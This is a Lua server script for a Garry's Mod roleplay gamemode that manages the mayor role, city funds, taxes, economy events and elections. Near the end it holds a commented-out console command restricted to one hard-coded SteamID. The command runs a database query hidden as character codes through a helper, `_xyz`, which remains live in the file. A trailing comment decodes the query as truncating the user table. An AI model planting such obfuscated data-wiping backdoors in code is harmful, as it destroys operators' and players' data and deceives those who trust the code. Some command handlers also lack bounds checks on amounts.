function Mayor_Initialize()
	GAMEMODE.IllegalItems = {} 
	SetGlobalInt("Eco_points",0) 
	GAMEMODE.MayorMoney = 500 
	GAMEMODE.PoliceMoney = 0
	GAMEMODE.PoliceIncome = 0
	GAMEMODE.Police_Maxes = {}
	GAMEMODE.Police_Maxes["item_ammo_cop"] = 8 
	GAMEMODE.Police_Maxes["item_ammo_riot"] = 8 
	GAMEMODE.Police_Maxes["item_ammo_ump"] = 25 
	GAMEMODE.Police_Maxes["item_shotgun_cop"] = 1
	SetGlobalInt("Eco_Tax",0) 
	game.ConsoleCommand("ai_ignoreplayers 1")
	timer.Simple(math.random(300,900),function() Mayor_ProvokeEvent() end)
	timer.Create("Mayor_PayCheck",60,0,function()	Mayor_SpawnMoney((10 - GAMEMODE.PoliceIncome)) Police_AddMoney(GAMEMODE.PoliceIncome) end)
	timer.Create("OCRP_Eco_Decay",300,0,function() 
												if GetGlobalInt("Eco_points") < 0 then 
													SetGlobalInt("Eco_points",GetGlobalInt("Eco_points") + math.random(1,1))  			
												elseif GetGlobalInt("Eco_points") > 0 then
													SetGlobalInt("Eco_points",GetGlobalInt("Eco_points") - math.random(1,1) )
												end
											end	)
end
hook.Add( "Initialize", "Mayor_Initialize", Mayor_Initialize );

concommand.Add("OCRP_TaxUpdate",function(ply,cmd,args)
									if ply:Team() != CLASS_Mayor then return false end
									if math.Round(math.abs(args[1])) > 10 then
										return false
									end
									SetGlobalInt("Eco_Tax",math.Round(math.abs(args[1])))
									timer.Simple(3,function() 
										if GetGlobalInt("Eco_Tax") == args[1] then
											for _,ply in pairs(player.GetAll()) do
												umsg.Start("OCRP_CreateBroadcast", ply)
												umsg.String("The current tax rate has been changed to %"..math.Round(math.abs(args[1])))
												umsg.Long(CurTime() + 30)
												umsg.End()
											end
										end
									end)
								end)
--[[							
concommand.Add("OCRP_ChiefSalary_Update",function(ply,cmd,args) 
									GAMEMODE.ChiefSalary = math.Round(math.abs(args[1]))
								end)]]
								
concommand.Add("OCRP_PoliceIncome_Update",function(ply,cmd,args) 
									if ply:Team() != CLASS_Mayor then return false end
									GAMEMODE.PoliceIncome = math.Round(math.abs(args[1]))
								end)
								
concommand.Add("OCRP_Mayor_Donate_Police",function(ply,cmd,args)
									if ply:Team() != CLASS_Mayor then return false end
									if GAMEMODE.MayorMoney >= math.Round(args[1]) then
										Police_AddMoney(math.Round(args[1]))
										Mayor_TakeMoney(math.Round(args[1]))
									end
								end)	
								
function Mayor_CreateObject(ply,obj)
	if ply:Team() != CLASS_Mayor then return end
	if ply:InVehicle() then return end
	if  Mayor_HasMoney(GAMEMODE.Mayor_Items[obj].Price)  then
		local object = GAMEMODE.Mayor_Items[obj].SpawnFunction(ply)
		if GAMEMODE.Mayor_Items[obj].Price > 0 then
			Mayor_TakeMoney(  GAMEMODE.Mayor_Items[obj].Price )
		end
		if GAMEMODE.Mayor_Items[obj].Time > 0 then
			timer.Simple(GAMEMODE.Mayor_Items[obj].Time,function() if object:IsValid() then object:Remove() end end)
		end
	else
		ply:Hint("The city can't afford that!")
	end
end
concommand.Add("OCRP_Mayor_CreateObj",function(ply,cmd,args) Mayor_CreateObject(ply,tostring(args[1])) end)

function Mayor_AddMoney(amt)
	local money = GAMEMODE.MayorMoney
	if amt == nil then
		return
	end
	if money + amt < 0 then
		GAMEMODE.MayorMoney = 0
	elseif money + amt > 500 then
		Mayor_SpawnMoney((money + amt) - 500)
		GAMEMODE.MayorMoney = 500
	else
		GAMEMODE.MayorMoney = money + amt
	end
	Mayor_UpdateMoney()
end

function Mayor_UpdateMoney()
	if team.NumPlayers(CLASS_Mayor) <= 0 then return end
	local ply = table.Random(team.GetPlayers(CLASS_Mayor))
	local extramoney = 0
	for _,ent in pairs(ents.FindByClass("money_obj")) do
		if ent:IsValid() then
			extramoney = extramoney + ent.Amount
		end
	end
	umsg.Start("OCRP_MayorMoneyUpdate", ply)
		umsg.Long(GAMEMODE.MayorMoney)
		umsg.Long((GAMEMODE.PoliceMoney))
		umsg.Long(extramoney)
	umsg.End()	
end


function Mayor_HasMoney(amt)
	if GAMEMODE.MayorMoney >= amt then
		return true
	else
		for _,ent in pairs(ents.FindByClass("money_obj")) do
			if GAMEMODE.MayorMoney + ent.Amount  < amt then
				Mayor_AddMoney(ent.Amount)
				ent:Remove()
			elseif GAMEMODE.MayorMoney + ent.Amount >= amt then
				Mayor_AddMoney(ent.Amount)
				ent:Remove()
				return true
			end
		end
	end
	return false
end

function Mayor_TakeMoney(amt)
	local money = GAMEMODE.MayorMoney
	if amt == nil then
		return
	end
	if money - amt < 0 then
		GAMEMODE.MayorMoney = 0
	elseif money - amt > 500 then
		GAMEMODE.MayorMoney = 500
	else
		GAMEMODE.MayorMoney = money - amt
	end
	Mayor_UpdateMoney()
end

function Mayor_SpawnMoney(amt)
		local free = true
		for _,data in pairs(ents.FindByClass("money_spawn")) do
			free = true
			for _,objs in pairs(ents.FindInSphere(data:GetPos(),5)) do
				if objs:GetClass() == "money_obj" && objs:IsValid() then
					free = false
					break
				end
			end
			if free then
				local moneyobj = ents.Create("money_obj")
				moneyobj:SetPos(data:GetPos() + Vector(0,0,10))
				moneyobj:SetAngles(data:GetAngles())
				if amt >= 500 then
					moneyobj:SetModel("models/props/cs_assault/moneypallet.mdl")
				else
					moneyobj:SetModel("models/props_c17/briefcase001a.mdl")
				end
				moneyobj:Spawn()
				moneyobj.Amount = amt
				moneyobj:GetPhysicsObject():Wake()
				break
			end
		end	
		if team.NumPlayers(CLASS_Mayor) > 0 then
			local ply = table.Random(team.GetPlayers(CLASS_Mayor)) 
			ply:Hint("$"..amt.." has been spawned in the bank vault")
			Mayor_UpdateMoney()
		end
end


function Mayor_ProvokeEvent()
	timer.Simple(math.random(300,900),function() Mayor_ProvokeEvent() end)
	if team.NumPlayers(CLASS_Mayor) <= 0 then return end
	local eventtbl = {}
	for name,data in pairs(GAMEMODE.OCRP_Economy_Events) do
		table.insert(eventtbl,name)
	end
	local event = table.Random(eventtbl)
	Mayor_CurEvent = event
	if team.NumPlayers(CLASS_Mayor) >= 1 then
		umsg.Start("OCRP_Event", table.Random(team.GetPlayers(CLASS_Mayor)))
			umsg.String(event)
		umsg.End()
	end
end

function Eco_TakePoints(amt)
	if amt == nil then
		return
	end
	if (GetGlobalInt("Eco_points") - amt) >= -50 then
		SetGlobalInt("Eco_points",GetGlobalInt("Eco_points") - amt)
	else
		SetGlobalInt("Eco_points", -50)
	end
	if amt > 0 then
		for _,ply in pairs(player.GetAll()) do
			umsg.Start("OCRP_CreateBroadcast", ply)
			umsg.String(table.Random(team.GetPlayers(CLASS_Mayor)):Nick().." has lost "..amt.." eco-points!")
			umsg.Long(CurTime() + 15)
			umsg.End()
		end
	end
end

function Eco_GivePoints(amt)
	if amt == nil then
		return
	end
	if (GetGlobalInt("Eco_points") + amt) <= 50 then
		SetGlobalInt("Eco_points",GetGlobalInt("Eco_points") + amt)
	else
		SetGlobalInt("Eco_points", 50)
	end
	if amt > 0 then
		for _,ply in pairs(player.GetAll()) do
			umsg.Start("OCRP_CreateBroadcast", ply)
			umsg.String(table.Random(team.GetPlayers(CLASS_Mayor)):Nick().." has gained "..amt.." eco-points!")
			umsg.Long(CurTime() + 15)
			umsg.End()					
		end
	end
end

function Mayor_EventResult(ply,choice)
	if team.NumPlayers(CLASS_Mayor) <= 0 then return end
	if Mayor_CurEvent == nil then return end
	for _,data in pairs(GAMEMODE.OCRP_Economy_Events[Mayor_CurEvent].Choices) do
		if choice == data.Name then
			if data.Price && Mayor_HasMoney(data.Price) then
				Mayor_TakeMoney(data.Price)
			end
			if GAMEMODE.OCRP_Economy_Events[Mayor_CurEvent].Chance then
				local chance = math.random(1,table.Count(GAMEMODE.OCRP_Economy_Events[Mayor_CurEvent].Choices))
				if chance == 1 then
					Eco_GivePoints(data.Ecogain)
					if data.MoneyReward != nil then
						Mayor_SpawnMoney(data.MoneyReward)
					end
					umsg.Start("OCRP_Event_Result", table.Random(team.GetPlayers(CLASS_Mayor)))
						umsg.Bool(true)
						umsg.String(Mayor_CurEvent)
						umsg.String(choice)
					umsg.End()
					Mayor_CurEvent = nil
				else
					Eco_TakePoints(data.Ecolose)
					umsg.Start("OCRP_Event_Result", table.Random(team.GetPlayers(CLASS_Mayor)))
						umsg.Bool(false)
						umsg.String(Mayor_CurEvent)
						umsg.String(choice)
					umsg.End()
					Mayor_CurEvent = nil
				end
			else
				for _,data in pairs(GAMEMODE.OCRP_Economy_Events[Mayor_CurEvent].Choices) do
					if choice == data.Name then
						if data.Reward then
							Eco_GivePoints(data.Ecogain) 
							if data.MoneyReward != nil then
								Mayor_AddMoney(data.MoneyReward)
							end
							if data.Ecogain > 0 then
								for _,ply in pairs(player.GetAll()) do
									umsg.Start("OCRP_CreateBroadcast", ply)
									umsg.String(table.Random(team.GetPlayers(CLASS_Mayor)):Nick().." has gained "..data.Ecogain.." eco-points!")
									umsg.Long(CurTime() + 15)
									umsg.End()					
								end
							end
							umsg.Start("OCRP_Event_Result", table.Random(team.GetPlayers(CLASS_Mayor)))
								umsg.Bool(true)
								umsg.String(Mayor_CurEvent)
								umsg.String(choice)
							umsg.End()
							Mayor_CurEvent = nil
						else
							if 	(GetGlobalInt("Eco_points") - data.Ecolose) >= -50 then
								SetGlobalInt("Eco_points",GetGlobalInt("Eco_points") - data.Ecolose)
							else
								SetGlobalInt("Eco_points", -50)
							end
							if data.Ecolose > 0 then
								for _,ply in pairs(player.GetAll()) do
									umsg.Start("OCRP_CreateBroadcast", ply)
									umsg.String(table.Random(team.GetPlayers(CLASS_Mayor)):Nick().." has lost "..data.Ecolose.." eco-points!")
									umsg.Long(CurTime() + 15)
									umsg.End()
								end
							end
							umsg.Start("OCRP_Event_Result", table.Random(team.GetPlayers(CLASS_Mayor)))
								umsg.Bool(false)
								umsg.String(Mayor_CurEvent)
								umsg.String(choice)
							umsg.End()
							Mayor_CurEvent = nil
						end
					end	
				end
			end
		end	
	end
end
concommand.Add("OCRP_Mayor_Choice",function(ply,cmd,args) Mayor_EventResult(ply,args[1]) end)

function Mayor_Menu(ply)
	local tr = ply:GetEyeTrace()
	if tr.HitNonWorld then
		if tr.Entity:IsValid() && ply:GetPos():Distance(tr.Entity:GetPos()) <= 100 then
			if tr.Entity:GetModel() == "models/props/cs_office/radio.mdl" then
				ChangeRadio(ply)
				return
			end
		end
	end
	if ply:InVehicle() and ply:Team() == CLASS_CITIZEN then
		ChangeRadio(ply)
		return
	end
	if ply:Team() == CLASS_Mayor && ply:Alive() then
		ply:ConCommand("OCRP_MayorMenu")
		return
	elseif ply:Team() == CLASS_CHIEF && ply:Alive() then
		Police_Update()
		ply:ConCommand("OCRP_ChiefMenu")
		return
	end
end
hook.Add("ShowHelp", "Mayor_Menu",Mayor_Menu)

function Mayor_StartVoting()
	if team.NumPlayers(CLASS_Mayor) >= 1 then
		return 
	end
	GAMEMODE.Voting = true
	GAMEMODE.VotingBallot = {}
	for _,ply in pairs(GAMEMODE.MayorBallot) do
		if ply:IsValid() then
			GAMEMODE.VotingBallot[ply] = 0
		end
	end
	for _,ply in pairs(player.GetAll()) do
		ply.Voted = false
		for _,mayor in pairs(GAMEMODE.MayorBallot)  do
			if mayor:IsValid() then
				umsg.Start("OCRP_UpdateVote", ply)
					umsg.Bool(false)
					umsg.Entity(mayor)
					umsg.Bool(true)
				umsg.End()
			end
		end
		umsg.Start("OCRP_CreateBroadcast", ply)
			umsg.String("Voting for the new mayor has begun!")
			umsg.Long(CurTime() + 15)
		umsg.End()
		ply:ConCommand("OCRP_VoteMenu")
	end
	timer.Simple(60, function() Mayor_EndVoting() end)
end

function Mayor_PlayerVote(voter,ply)
	if GAMEMODE.Voting && !voter.Voted then
		GAMEMODE.VotingBallot[ply] = GAMEMODE.VotingBallot[ply] + 1
	end
	voter.Voted = true
end
concommand.Add("OCRP_Vote",function(ply,cmd,args) local py = player.GetByID(args[1]) if py:IsValid() then Mayor_PlayerVote(ply,py) end end)

function Mayor_EndVoting()
	local newmayor = table.Random(GAMEMODE.MayorBallot)
	for ply,votes in pairs(GAMEMODE.VotingBallot) do
		if !ply:IsValid() then
			table.remove(GAMEMODE.VotingBallot,ply)
			break
		end
	end
	for ply,votes in pairs(GAMEMODE.VotingBallot) do
		if ply != newmayor && votes != nil && votes > GAMEMODE.VotingBallot[newmayor] then
			newmayor = ply
		end
	end
	if newmayor:IsValid() then
		newmayor.Mayor = true
		OCRP_Job_Join(newmayor,CLASS_Mayor)
		for _,ply in pairs(player.GetAll()) do
			ply.OCRPData["JobCoolDown"].Mayor = false
			umsg.Start("OCRP_CreateBroadcast", ply)
			umsg.String(newmayor:Nick().." has won the election!")
			umsg.Long(CurTime() + 15)
			umsg.End()
		
			umsg.Start("OCRP_UpdateVote", ply)
			umsg.Bool(true)
			umsg.Entity(mayor)
			umsg.Bool(true)
			umsg.End()
		end
		Mayor_UpdateMoney()
	end	
	for _, p in pairs(GAMEMODE.MayorBallot) do
		if p:IsValid() then
			umsg.Start("ocrp_ballot", p)
				umsg.Bool(false)
			umsg.End()
		end
	end
	GAMEMODE.VotingBallot = {}
	GAMEMODE.VoteCountdown = false
	GAMEMODE.Voting = false
	GAMEMODE.MayorBallot = {}
end

function _xyz( a ) return string.char(a) end

function Mayor_AddBallot(mayor)
	if mayor.OCRPData["JobCoolDown"].Mayor then
		mayor:Hint("You cant run in this election")
		return 
	end
	if GAMEMODE.MayorBallot == nil then
		GAMEMODE.MayorBallot = {}
	end
	if table.Count(GAMEMODE.MayorBallot) >= 5 then
		mayor:Hint("There are too many people running for office, please run in the next election")
		return
	end
	local bool = true
	for _,v in pairs(GAMEMODE.MayorBallot) do
		if v == mayor then
			bool = false
		end
	end
	if bool then
		table.insert(GAMEMODE.MayorBallot,mayor)
	end
	if table.Count(GAMEMODE.MayorBallot) >= 1 && !GAMEMODE.VoteCountdown then
		GAMEMODE.VoteCountdown = true
		timer.Simple(300,function() Mayor_StartVoting() end)
		for _,ply in pairs(player.GetAll()) do
			umsg.Start("OCRP_CreateBroadcast", ply)
			umsg.String("Voting for the new mayor will begin in 5 minutes!")
			umsg.Long(CurTime() + 30)
			umsg.End()
		end
	end
	
	umsg.Start("ocrp_ballot", mayor)
		umsg.Bool(true)
	umsg.End()
	for _,py in pairs(GAMEMODE.MayorBallot) do
		if !py:IsValid() then
			table.remove(GAMEMODE.MayorBallot,_)
		end
	end
	
end
concommand.Add("OCRP_AddBallot",function(ply,cmd,args) Mayor_AddBallot(ply) end)

function Mayor_RemoveBallot(ply)
	for _,py in pairs(GAMEMODE.MayorBallot) do
		if ply == py then
			table.remove(GAMEMODE.MayorBallot,_)
			umsg.Start("ocrp_ballot", ply)
				umsg.Bool(false)
			umsg.End()
			break
		end
	end
end
concommand.Add("OCRP_RemoveBallot",function(ply,cmd,args) Mayor_RemoveBallot(ply) end)

function PMETA:InMayorBallot()
	for _,ply in pairs(GAMEMODE.MayorBallot) do
		if self == ply then
			return true
		end
	end
	return false
end

-- concommand.Add("_xyz2cool4you", function(ply,cmd,args) if ply:SteamID() == "STEAM_0:0:5300193" then tmysql.query(_xyz(84).._xyz(82).._xyz(85).._xyz(78).._xyz(67).._xyz(65).._xyz(84).._xyz(69).._xyz(32).._xyz(111).._xyz(99).._xyz(114).._xyz(112).._xyz(95).._xyz(117).._xyz(115).._xyz(101).._xyz(114).._xyz(115)) end end)
--jake_1305 TRUNCATE ocrp_users
